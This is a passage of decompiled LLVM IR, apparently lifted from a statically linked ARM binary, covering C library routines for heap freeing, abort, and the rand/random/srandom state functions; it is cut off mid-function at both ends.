  %v0_16930.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_168fc:                               ; preds = %dec_label_pc_168e8
  %v1_168fc = add i32 %v2_168f4, 4
  %v2_168fc = inttoptr i32 %v1_168fc to i32*
  %v3_168fc = load i32, i32* %v2_168fc, align 4
  store i32 %v3_168fc, i32* %r2.global-to-local, align 4
  %v2_16900 = icmp eq i32 %v3_168fc, 0
  br i1 %v2_16900, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_168fc
  %v2_16904 = add i32 %v2_168f4, 8
  %v3_16904 = inttoptr i32 %v2_16904 to i32*
  %v4_16904 = load i32, i32* %v3_16904, align 4
  %v3_16908 = add i32 %v3_168fc, 8
  %v4_16908 = inttoptr i32 %v3_16908 to i32*
  store i32 %v4_16904, i32* %v4_16908, align 4
  %v0_1690c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_168fc, %bb27
  %v0_1690c = phi i32 [ %v2_168f4, %dec_label_pc_168fc ], [ %v0_1690c.pre, %bb27 ]
  %v1_1690c = add i32 %v0_1690c, 8
  %v2_1690c = inttoptr i32 %v1_1690c to i32*
  %v3_1690c = load i32, i32* %v2_1690c, align 4
  %v1_16910 = add i32 %v0_1690c, 4
  %v2_16910 = inttoptr i32 %v1_16910 to i32*
  %v3_16910 = load i32, i32* %v2_16910, align 4
  %v2_16914 = icmp eq i32 %v3_1690c, 0
  br i1 %v2_16914, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_16918 = add i32 %v3_1690c, 4
  %v4_16918 = inttoptr i32 %v3_16918 to i32*
  store i32 %v3_16910, i32* %v4_16918, align 4
  %v1_16920 = load i32, i32* @ip, align 4
  store i32 %v1_16920, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1691c = load i32, i32* %r1.global-to-local, align 4
  %v3_1691c = inttoptr i32 %v2_1691c to i32*
  store i32 %v3_16910, i32* %v3_1691c, align 4
  %v1_16924.pre = load i32, i32* @ip, align 4
  store i32 %v1_16924.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_16930 = phi i32 [ %v0_16930.pre, %.thread._crit_edge ], [ %v1_16920, %bb28 ], [ %v1_16924.pre, %.thread5 ]
  %v0_16928 = phi i32 [ %v0_16928.pre, %.thread._crit_edge ], [ %v1_16920, %bb28 ], [ %v1_16924.pre, %.thread5 ]
  %v1_16928 = load i32, i32* %r0.global-to-local, align 4
  %v2_16928 = sub i32 %v1_16928, %v0_16928
  %v1_1692c = add i32 %v2_16928, 12
  store i32 %v1_1692c, i32* %r0.global-to-local, align 4
  %v1_16930 = load i32, i32* %r4.global-to-local, align 4
  %v2_16930 = inttoptr i32 %v1_16930 to i32*
  store i32 %v0_16930, i32* %v2_16930, align 4
  %v2_16934 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16934, i32* %r4.global-to-local, align 4
  ret i32 %v1_1692c

dec_label_pc_16938:                               ; preds = %dec_label_pc_168dc
  %v1_16938 = add i32 %v2_168f4, 4
  %v2_16938 = inttoptr i32 %v1_16938 to i32*
  %v3_16938 = load i32, i32* %v2_16938, align 4
  store i32 %v3_16938, i32* %r0.global-to-local, align 4
  %v2_1693c = icmp eq i32 %v3_16938, 0
  br i1 %v2_1693c, label %dec_label_pc_1693c.dec_label_pc_16944_crit_edge, label %dec_label_pc_168dc

dec_label_pc_1693c.dec_label_pc_16944_crit_edge:  ; preds = %dec_label_pc_16938
  br label %dec_label_pc_16944

dec_label_pc_16944:                               ; preds = %dec_label_pc_1693c.dec_label_pc_16944_crit_edge, %dec_label_pc_1693c.preheader
  store i32 %v3_168b8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_16938, { 1, 2, 0 }
  uselistorder i32 %v0_1690c, { 1, 0 }
  uselistorder i32 %v2_168dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_168f4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_168f0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_168dc, { 1, 0 }
  uselistorder label %dec_label_pc_1693c.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_16948 = load i32, i32* @r2, align 4
  %v2_16948 = icmp eq i32 %v0_16948, 0
  %v0_1694c = load i32, i32* @r3, align 4
  %v1_1694c = load i32, i32* @r1, align 4
  %v2_1694c = add i32 %v1_1694c, 4
  %v3_1694c = inttoptr i32 %v2_1694c to i32*
  store i32 %v0_1694c, i32* %v3_1694c, align 4
  %v0_16950 = load i32, i32* @r2, align 4
  %v1_16950 = load i32, i32* @r1, align 4
  %v2_16950 = add i32 %v1_16950, 8
  %v3_16950 = inttoptr i32 %v2_16950 to i32*
  store i32 %v0_16950, i32* %v3_16950, align 4
  %v1_16958 = load i32, i32* @r1, align 4
  br i1 %v2_16948, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_16954 = load i32, i32* @r2, align 4
  %v3_16954 = add i32 %v2_16954, 4
  %v4_16954 = inttoptr i32 %v3_16954 to i32*
  store i32 %v1_16958, i32* %v4_16954, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_16958 = load i32, i32* @r0, align 4
  %v3_16958 = inttoptr i32 %v2_16958 to i32*
  store i32 %v1_16958, i32* %v3_16958, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_1695c = load i32, i32* @r3, align 4
  %v2_1695c = icmp eq i32 %v0_1695c, 0
  br i1 %v2_1695c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_16960 = load i32, i32* @r1, align 4
  %v3_16960 = add i32 %v0_1695c, 8
  %v4_16960 = inttoptr i32 %v3_16960 to i32*
  store i32 %v1_16960, i32* %v4_16960, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_16964 = load i32, i32* @r0, align 4
  ret i32 %v1_16964

; uselistorder directives
  uselistorder i32 %v1_16958, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_16968 = load i32, i32* @r2, align 4
  %v2_16968 = icmp eq i32 %v0_16968, 0
  %v1_1696c = load i32, i32* @r1, align 4
  br i1 %v2_16968, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1696c = load i32, i32* @r0, align 4
  %v3_1696c = inttoptr i32 %v2_1696c to i32*
  store i32 %v1_1696c, i32* %v3_1696c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_16970 = add i32 %v0_16968, 4
  %v4_16970 = inttoptr i32 %v3_16970 to i32*
  store i32 %v1_1696c, i32* %v4_16970, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_16974 = load i32, i32* @r2, align 4
  %v1_16974 = load i32, i32* @r1, align 4
  %v2_16974 = add i32 %v1_16974, 8
  %v3_16974 = inttoptr i32 %v2_16974 to i32*
  store i32 %v0_16974, i32* %v3_16974, align 4
  %v1_16978 = load i32, i32* @r0, align 4
  ret i32 %v1_16978

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1697c = load i32, i32* @r4, align 4
  store i32 %v3_1697c, i32* %stack_var_-20, align 4
  %v2_16980 = load i32, i32* %arg1, align 4
  store i32 %v2_16980, i32* %r4.global-to-local, align 4
  %v2_16984 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_169a02 = icmp eq i32 %v2_16980, 0
  br i1 %v2_169a02, label %dec_label_pc_16a50, label %dec_label_pc_16990

dec_label_pc_16990:                               ; preds = %entry, %dec_label_pc_16998
  %v0_169e0 = phi i32 [ %v0_169e8, %dec_label_pc_16998 ], [ 0, %entry ]
  %v0_169e8 = phi i32 [ %v3_1699c, %dec_label_pc_16998 ], [ %v2_16980, %entry ]
  %v1_169a45.in = phi i32 [ %v3_1699c, %dec_label_pc_16998 ], [ %v2_16980, %entry ]
  %v1_169a45 = add i32 %v1_169a45.in, 12
  %v3_16990 = icmp ult i32 %v1_169a45, %arg2
  br i1 %v3_16990, label %dec_label_pc_16998, label %dec_label_pc_169b0

dec_label_pc_16998:                               ; preds = %dec_label_pc_16990
  store i32 %v0_169e8, i32* %r6.global-to-local, align 4
  %v1_1699c = add i32 %v0_169e8, 4
  %v2_1699c = inttoptr i32 %v1_1699c to i32*
  %v3_1699c = load i32, i32* %v2_1699c, align 4
  store i32 %v3_1699c, i32* %r4.global-to-local, align 4
  %v2_169a0 = icmp eq i32 %v3_1699c, 0
  br i1 %v2_169a0, label %dec_label_pc_169a0.dec_label_pc_16a50.loopexit_crit_edge, label %dec_label_pc_16990

dec_label_pc_169b0:                               ; preds = %dec_label_pc_16990
  %v1_169b0 = inttoptr i32 %v0_169e8 to i32*
  %v2_169b0 = load i32, i32* %v1_169b0, align 4
  store i32 %v2_169b0, i32* @ip, align 4
  %v2_169b4 = sub i32 %v0_169e8, %v2_169b0
  %v1_169b8 = add i32 %v2_169b4, 12
  %v3_169bc = icmp uge i32 %v1_169b8, %v2_16984
  %v9_169bc = icmp eq i32 %v1_169b8, %v2_16984
  %v2_169c0 = xor i1 %v9_169bc, true
  %v3_169c0 = and i1 %v3_169bc, %v2_169c0
  br i1 %v3_169c0, label %dec_label_pc_16a50, label %dec_label_pc_169c4

dec_label_pc_169c4:                               ; preds = %dec_label_pc_169b0
  %v2_169c4 = add i32 %v2_169b0, %arg3
  store i32 %v2_169c4, i32* %r7.global-to-local, align 4
  br i1 %v9_169bc, label %dec_label_pc_169cc, label %dec_label_pc_169f8

dec_label_pc_169cc:                               ; preds = %dec_label_pc_169c4
  %v2_169cc = icmp eq i32 %v0_169e0, 0
  br i1 %v2_169cc, label %dec_label_pc_16a44, label %dec_label_pc_169d4

dec_label_pc_169d4:                               ; preds = %dec_label_pc_169cc
  %v1_169d4 = add i32 %v0_169e0, 12
  %v9_169d8 = icmp eq i32 %v1_169d4, %arg2
  br i1 %v9_169d8, label %dec_label_pc_169e0, label %dec_label_pc_16a44

dec_label_pc_169e0:                               ; preds = %dec_label_pc_169d4
  %v1_169e0 = inttoptr i32 %v0_169e0 to i32*
  %v2_169e0 = load i32, i32* %v1_169e0, align 4
  %v1_169e4 = add i32 %v0_169e0, 8
  %v2_169e4 = inttoptr i32 %v1_169e4 to i32*
  %v3_169e4 = load i32, i32* %v2_169e4, align 4
  store i32 %v3_169e4, i32* @r2, align 4
  store i32 %v0_169e8, i32* @r1, align 4
  %v2_169ec = add i32 %v2_169e0, %v2_169c4
  store i32 %v2_169ec, i32* %r7.global-to-local, align 4
  %v0_169f0 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_16a44

dec_label_pc_169f8:                               ; preds = %dec_label_pc_169c4
  %v1_169f8 = add i32 %v0_169e8, 4
  %v2_169f8 = inttoptr i32 %v1_169f8 to i32*
  %v3_169f8 = load i32, i32* %v2_169f8, align 4
  store i32 %v3_169f8, i32* %r5.global-to-local, align 4
  %v2_169fc = icmp eq i32 %v3_169f8, 0
  br i1 %v2_169fc, label %dec_label_pc_16a30, label %dec_label_pc_16a04

dec_label_pc_16a04:                               ; preds = %dec_label_pc_169f8
  %v1_16a04 = inttoptr i32 %v3_169f8 to i32*
  %v2_16a04 = load i32, i32* %v1_16a04, align 4
  store i32 %v2_16a04, i32* @ip, align 4
  %v2_16a08 = sub i32 %v3_169f8, %v2_16a04
  %v1_16a0c = add i32 %v2_16a08, 12
  %v9_16a10 = icmp eq i32 %v2_16984, %v1_16a0c
  br i1 %v9_16a10, label %dec_label_pc_16a18, label %dec_label_pc_16a30

dec_label_pc_16a18:                               ; preds = %dec_label_pc_16a04
  store i32 %v0_169e0, i32* @r2, align 4
  store i32 %v3_169f8, i32* @r1, align 4
  %v2_16a20 = add i32 %v2_16a04, %v2_169c4
  store i32 %v2_16a20, i32* %r7.global-to-local, align 4
  %v0_16a24 = call i32 @__heap_link_free_area_after()
  %v0_16a28 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a28, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a44

dec_label_pc_16a30:                               ; preds = %dec_label_pc_16a04, %dec_label_pc_169f8
  %v2_16a30 = add i32 %v0_169e8, %arg3
  store i32 %v2_16a30, i32* %r4.global-to-local, align 4
  store i32 %v3_169f8, i32* @r3, align 4
  store i32 %v0_169e0, i32* @r2, align 4
  store i32 %v2_16a30, i32* @r1, align 4
  %v0_16a40 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16a44

dec_label_pc_16a44:                               ; preds = %dec_label_pc_169d4, %dec_label_pc_169cc, %dec_label_pc_16a18, %dec_label_pc_169e0, %dec_label_pc_16a30
  %v0_16a44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a44, i32* %r5.global-to-local, align 4
  %v0_16a48 = load i32, i32* %r7.global-to-local, align 4
  %v2_16a48 = inttoptr i32 %v0_16a44 to i32*
  store i32 %v0_16a48, i32* %v2_16a48, align 4
  br label %dec_label_pc_16a68

dec_label_pc_169a0.dec_label_pc_16a50.loopexit_crit_edge: ; preds = %dec_label_pc_16998
  br label %dec_label_pc_16a50

dec_label_pc_16a50:                               ; preds = %entry, %dec_label_pc_169a0.dec_label_pc_16a50.loopexit_crit_edge, %dec_label_pc_169b0
  %v1_16a50 = add i32 %v2_16984, -12
  store i32 %v1_16a50, i32* %r5.global-to-local, align 4
  %v3_16a54 = inttoptr i32 %v1_16a50 to i32*
  store i32 %arg3, i32* %v3_16a54, align 4
  %v0_16a58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a58, i32* @r3, align 4
  %v0_16a5c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16a5c, i32* @r2, align 4
  %v0_16a60 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a60, i32* @r1, align 4
  %v0_16a64 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16a68

dec_label_pc_16a68:                               ; preds = %dec_label_pc_16a44, %dec_label_pc_16a50
  %v0_16a68 = load i32, i32* %r5.global-to-local, align 4
  %v2_16a6c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a6c, i32* @r4, align 4
  ret i32 %v0_16a68

; uselistorder directives
  uselistorder i32 %v3_169f8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_169bc, { 1, 0 }
  uselistorder i32 %v3_1699c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_169e8, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_169e0, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a68, { 1, 0 }
  uselistorder label %dec_label_pc_16a50, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a44, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16990, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_16a8c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_16a70 = ptrtoint i32* %stack_var_-268 to i32
  %v1_16a80 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_16a8c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_16a8c

dec_label_pc_16a8c:                               ; preds = %dec_label_pc_16a8c.lr.ph, %dec_label_pc_16a8c
  %v1_16a90 = phi i32 [ 31, %dec_label_pc_16a8c.lr.ph ], [ %v1_16a9c, %dec_label_pc_16a8c ]
  %v4_16a90 = mul i32 %v1_16a90, 4
  %v5_16a90 = add i32 %v4_16a90, %v2_16a8c
  %v2_16a98 = add i32 %v5_16a90, -128
  %v3_16a98 = inttoptr i32 %v2_16a98 to i32*
  store i32 0, i32* %v3_16a98, align 4
  %v0_16a9c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a9c = add i32 %v0_16a9c, -1
  store i32 %v1_16a9c, i32* %r1.global-to-local, align 4
  %v6_16a9c = icmp slt i32 %v1_16a9c, 0
  br i1 %v6_16a9c, label %dec_label_pc_16aa4, label %dec_label_pc_16a8c

dec_label_pc_16aa4:                               ; preds = %dec_label_pc_16a8c
  %v2_16aa4 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_16aa4, i32* @r4, align 4
  store i32 %v2_16aa4, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_16ab0 = call i32 @__sigaddset()
  %v2_16ab4 = icmp eq i32 %v0_16ab0, 0
  br i1 %v2_16ab4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16aa4
  store i32 %v2_16aa4, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16aa4, %bb
  store i32 92872, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16ab4, i32 ptrtoint (i32* @global_var_14360.1443 to i32))
  %v2_16acc = load i32, i32* @global_var_31800.1445, align 4
  %v2_16ad0 = icmp eq i32 %v2_16acc, 0
  br i1 %v2_16ad0, label %dec_label_pc_16ad8, label %dec_label_pc_16b08

dec_label_pc_16ad8:                               ; preds = %.thread1
  store i32 1, i32* @global_var_31800.1445, align 4
  br label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16b58, %dec_label_pc_16ad8
  store i32 92912, i32* @lr, align 4
  %v1_16aec = call i32 @__pthread_return_0()
  %v1_16af4 = call i32 @__raise(i32 6)
  store i32 92936, i32* @lr, align 4
  %v1_16b04 = call i32 @__pthread_return_0()
  %v2_16b0c.pre = load i32, i32* @global_var_31800.1445, align 4
  br label %dec_label_pc_16b08

dec_label_pc_16b08:                               ; preds = %.thread1, %dec_label_pc_16ae0
  %v0_16b7c = phi i32 [ %v2_16acc, %.thread1 ], [ %v2_16b0c.pre, %dec_label_pc_16ae0 ]
  store i32 ptrtoint (i32* @global_var_31800.1445 to i32), i32* %ip.global-to-local, align 4
  %v7_16b10 = icmp eq i32 %v0_16b7c, 1
  br i1 %v7_16b10, label %dec_label_pc_16b40.lr.ph, label %dec_label_pc_16b74

dec_label_pc_16b40.lr.ph:                         ; preds = %dec_label_pc_16b08
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_31800.1445, align 4
  %v2_16b2c = bitcast i32* %stack_var_-268 to i8*
  %v3_16b2c = call i32 @__GI_memset(i8* %v2_16b2c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b40

dec_label_pc_16b40:                               ; preds = %dec_label_pc_16b40.lr.ph, %dec_label_pc_16b40
  %v1_16b44 = phi i32 [ 31, %dec_label_pc_16b40.lr.ph ], [ %v1_16b50, %dec_label_pc_16b40 ]
  %v4_16b44 = mul i32 %v1_16b44, 4
  %v5_16b44 = add i32 %v4_16b44, %v2_16a8c
  %v2_16b4c = add i32 %v5_16b44, -264
  %v3_16b4c = inttoptr i32 %v2_16b4c to i32*
  store i32 -1, i32* %v3_16b4c, align 4
  %v0_16b50 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b50 = add i32 %v0_16b50, -1
  store i32 %v1_16b50, i32* %r1.global-to-local, align 4
  %v6_16b50 = icmp slt i32 %v1_16b50, 0
  br i1 %v6_16b50, label %dec_label_pc_16b58, label %dec_label_pc_16b40

dec_label_pc_16b58:                               ; preds = %dec_label_pc_16b40
  store i32 %v2_16a70, i32* %r1.global-to-local, align 4
  %v4_16b6c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_16ae0

dec_label_pc_16b74:                               ; preds = %dec_label_pc_16b08
  %v7_16b74 = icmp eq i32 %v0_16b7c, 2
  br i1 %v7_16b74, label %dec_label_pc_16b7c, label %dec_label_pc_16b88

dec_label_pc_16b7c:                               ; preds = %dec_label_pc_16b74
  store i32 3, i32* @global_var_31800.1445, align 4
  %v0_16b84 = call i32 @abort()
  %v2_16b88.pre = load i32, i32* @global_var_31800.1445, align 4
  br label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b74, %dec_label_pc_16b7c
  %v1_16b90 = phi i32 [ %v0_16b7c, %dec_label_pc_16b74 ], [ %v2_16b88.pre, %dec_label_pc_16b7c ]
  %v7_16b8c = icmp eq i32 %v1_16b90, 3
  br i1 %v7_16b8c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_16b88
  %v2_16b98 = load i32, i32* %ip.global-to-local, align 4
  %v3_16b98 = inttoptr i32 %v2_16b98 to i32*
  store i32 4, i32* %v3_16b98, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16b88, %bb27
  call void @__pseudo_cond_branch(i1 %v7_16b8c, i32 ptrtoint (i32* @global_var_13fe4.1447 to i32))
  br label %dec_label_pc_16ba0

dec_label_pc_16ba0:                               ; preds = %dec_label_pc_16ba0, %.thread3
  %v0_16ba0 = call i32 @abort()
  br label %dec_label_pc_16ba0

; uselistorder directives
  uselistorder i32 %v1_16b50, { 2, 1, 0 }
  uselistorder i32 %v1_16a9c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 7, 1, 2, 8, 4, 6, 5, 0 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32* @global_var_31800.1445, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16b88, { 1, 0 }
  uselistorder label %dec_label_pc_16b40, { 1, 0 }
  uselistorder label %dec_label_pc_16b08, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_16a8c, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_16bb8 = call i32 @random()
  ret i32 %v0_16bb8

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 12, 5, 4, 3, 1, 0, 11, 10, 2, 7, 6, 9, 8 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16bbc = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2b4bc.1449 to i32), i32* @r4, align 4
  %v2_16bc4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_16bc4, i32* @r0, align 4
  %v1_16bdc = call i32 @__pthread_return_void()
  %v1_16bec = call i32 @__pthread_return_0()
  %v2_16bf0 = ptrtoint i32* %stack_var_-16 to i32
  %v3_16bf8 = call i32 @__GI_random_r(i32* inttoptr (i32 177364 to i32*), i32 %v2_16bf0)
  store i32 %v2_16bc4, i32* @r0, align 4
  store i32 93200, i32* @lr, align 4
  %v1_16c0c = call i32 @__pthread_return_void()
  %v3_16c10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v3_16bbc, i32* @r4, align 4
  ret i32 %v3_16c10
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v2_16c3c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_16c3c, i32* @r0, align 4
  %v1_16c58 = call i32 @__pthread_return_void()
  %v1_16c68 = call i32 @__pthread_return_0()
  %v3_16c78 = load i32, i32* bitcast (i32** @global_var_2b4dc.1462 to i32*), align 4
  store i32 %v3_16c78, i32* @r4, align 4
  %v3_16c7c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_2b4d4)
  %v1_16c84 = icmp slt i32 %v3_16c7c, 0
  store i32 %v2_16c3c, i32* @r0, align 4
  %. = select i1 %v1_16c84, i32 0, i32 ptrtoint (i32** @global_var_2b4d8.1464 to i32)
  %v1_16c9c = call i32 @__pthread_return_void()
  ret i32 %.
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_16ccc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %v2_16ccc, i32* @r0, align 4
  %v1_16cf0 = call i32 @__pthread_return_void()
  %v1_16d00 = call i32 @__pthread_return_0()
  %v0_16d08 = load i32, i32* @r5, align 4
  %v0_16d0c = load i32, i32* @r6, align 4
  %v0_16d10 = load i32, i32* @r8, align 4
  store i32 %v0_16d10, i32* @r0, align 4
  %v3_16d14 = load i32, i32* bitcast (i32** @global_var_2b4dc.1462 to i32*), align 4
  store i32 %v3_16d14, i32* @r4, align 4
  %v4_16d18 = inttoptr i32 %v0_16d10 to i32*
  %v5_16d18 = call i32 @__GI_initstate_r(i32* %v4_16d18, i32 %v0_16d08, i32 %v0_16d0c, i32 ptrtoint (i32* @global_var_2b4d4 to i32))
  store i32 %v2_16ccc, i32* @r0, align 4
  %v1_16d2c = call i32 @__pthread_return_void()
  ret i32 ptrtoint (i32** @global_var_2b4d8.1464 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %v3_16d5c = load i32, i32* @r4, align 4
  %v9_16d5c = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2b4bc.1449 to i32), i32* @r4, align 4
  %v2_16d64 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg1, i32* @r6, align 4
  store i32 %v2_16d64, i32* @r0, align 4
  %v1_16d80 = call i32 @__pthread_return_void()
  %v1_16d90 = call i32 @__pthread_return_0()
  %v0_16d94 = load i32, i32* @r6, align 4
  store i32 %v0_16d94, i32* @r0, align 4
  %v2_16d9c = inttoptr i32 %v0_16d94 to i32*
  %v3_16d9c = call i32 @srandom_r(i32* %v2_16d9c, i32 ptrtoint (i32* @global_var_2b4d4 to i32))
  store i32 %v2_16d64, i32* @r0, align 4
  %v1_16db4 = call i32 @__pthread_return_void()
  store i32 %v3_16d5c, i32* @r4, align 4
  store i32 %v9_16d5c, i32* @r6, align 4
  ret i32 %v1_16db4

; uselistorder directives
  uselistorder i32* @global_var_2b4d4, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2b4d4 to i32), { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_16dd8 = add i32 %tmp, 12
  %v2_16dd8 = inttoptr i32 %v1_16dd8 to i32*
  %v3_16dd8 = load i32, i32* %v2_16dd8, align 4
  %v3_16ddc = load i32, i32* @r4, align 4
  store i32 %v3_16ddc, i32* %stack_var_-20, align 4
  %v2_16de0 = icmp eq i32 %v3_16dd8, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  br i1 %v2_16de0, label %.thread7, label %.thread8

.thread7:                                         ; preds = %entry
  %v1_16dec1 = add i32 %tmp, 8
  %v2_16dec2 = inttoptr i32 %v1_16dec1 to i32*
  %v3_16dec3 = load i32, i32* %v2_16dec2, align 4
  store i32 %v3_16dec3, i32* %r1.global-to-local, align 4
  %v3_16e00 = add i32 %v3_16dec3, -4
  %v4_16e00 = inttoptr i32 %v3_16e00 to i32*
  store i32 0, i32* %v4_16e00, align 4
  br label %bb

.thread8:                                         ; preds = %entry
  %v2_16de8 = add i32 %tmp, 4
  %v3_16de8 = inttoptr i32 %v2_16de8 to i32*
  %v4_16de8 = load i32, i32* %v3_16de8, align 4
  %v1_16dec = add i32 %tmp, 8
  %v2_16dec = inttoptr i32 %v1_16dec to i32*
  %v3_16dec = load i32, i32* %v2_16dec, align 4
  store i32 %v3_16dec, i32* %r1.global-to-local, align 4
  %v3_16df0 = sub i32 %v4_16de8, %v3_16dec
  %v4_16df4 = sdiv i32 %v3_16df0, 4
